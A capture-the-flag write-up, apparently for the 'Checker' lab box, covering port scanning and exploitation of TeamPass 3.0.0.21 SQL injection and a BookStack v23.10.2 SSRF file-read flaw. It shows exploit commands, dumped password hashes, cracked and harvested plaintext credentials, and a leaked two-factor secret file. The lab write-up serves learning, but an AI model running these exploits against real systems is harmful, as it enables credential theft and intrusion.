1, Recon
port scan
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Page check
This is the port 80 web service
![](images/Pasted%20image%2020250310102023.png)
In this place, when I want to fuzz the valid web-content, I get the code 429 Too much request, that means there is a WAF here.

This is port 8080 web service
![[images/Screenshot 2025-04-19 at 11.06.04 PM.png]]
From this page source code, I found something interesting here
```
<link rel="shortcut icon" type="image/png" href="[http://vault.checker.htb/favicon.ico](view-source:http://vault.checker.htb/favicon.ico)"/>
</head>
```
There is another sub-domain here `vault.checker.htb`
But when we want to check what is going on in this subdomain, it would redirect to `http://checker.htb/login`
![](images/Pasted%20image%2020250420091030.png)

So let's continue to check the vulnerability of this port 8080
I want to check the service `Teampass` from the exploit-db
Then we found `TeamPass 3.0.0.21 - SQL Injection` from exploit-db, we can also run the exploit script here.
```
python3 sql_injection.py http://checker.htb:8080/
2025-04-20 09:12:47,926 - INFO - Encontrados 2 usuários no sistema
2025-04-20 09:12:48,216 - INFO - Credenciais obtidas para: admin
2025-04-20 09:12:48,506 - INFO - Credenciais obtidas para: bob

Credenciais encontradas:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

Use john to crack and get bob's password
```
bob:cheerleader
```

Then we can successfully get into the dashboard
![](images/Pasted%20image%2020250420091511.png)
Then we can check the items to find something interesting
![](images/Pasted%20image%2020250420091639.png)
We can get the credit `bob@checker.htb:mYSeCr3T_w1kI_P4sSw0rD`

And also, we can use this login to the web service of port 80
![](images/Pasted%20image%2020250420091744.png)
Try to ssh to connect the account reader
`reader：hiccup-publicly-genesis`
![](images/Pasted%20image%2020250420091859.png)
But we can not login directly
```
ssh reader@checker.htb
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
```
There will be a Verification code here

From the source code of `BookStack`, we can find the version of this service
```
 <!-- Social Cards Meta -->
    <meta property="og:title" content="BookStack">
    <meta property="og:url" content="http://checker.htb">
    
    <!-- Styles -->
    <link rel="stylesheet" href="[http://checker.htb/dist/styles.css?version=v23.10.2](view-source:http://checker.htb/dist/styles.css?version=v23.10.2)">
```
`BookStack v23.10.2`
Then we can search about this version of service, and find something vulnerable
`LFR via SSRF in BookStack: Beware of insecure-by-default libraries!`
Let's try to make the exploit script
```
$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/9/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}'
[*] The following URL is targeted : http://checker.htb/ajax/page/9/save-draft
[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN": "2eWRQgwyDzLfzL8amvM5z4iVprsO0GaXBQG0K2gw", "Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjExbkJYcmlaZTJITE5IREtSSllVUGc9PSIsInZhbHVlIjoiMUZBcjZTcFFYVFZNMklPenMyb3pveHNyUFNHdytsTEVMbkcyZjh1RERqNXhjdE5zVXdSYWczZTlEck9xTXJrazB3MS9ZbUZCS0pRODVkQjR0UGcvUU9MS1AyeW8yUW9yMmNzTE92aGFRbUNFeVAzeUtjMWFZQnpWTU5mMlNraEoiLCJtYWMiOiI3N2YzMGYxMjM5OGM5YmEwZGMxZTAzMmZiMGMxNjU1YzBhZjhmNjNjYTI5N2MwYmM5NzUyOGVlYzVjZTQ3M2Y4IiwidGFnIjoiIn0%3D"}
RFZEQlJB
b'<SECRET_KEY>\n" TOTP_AUTH\n'

```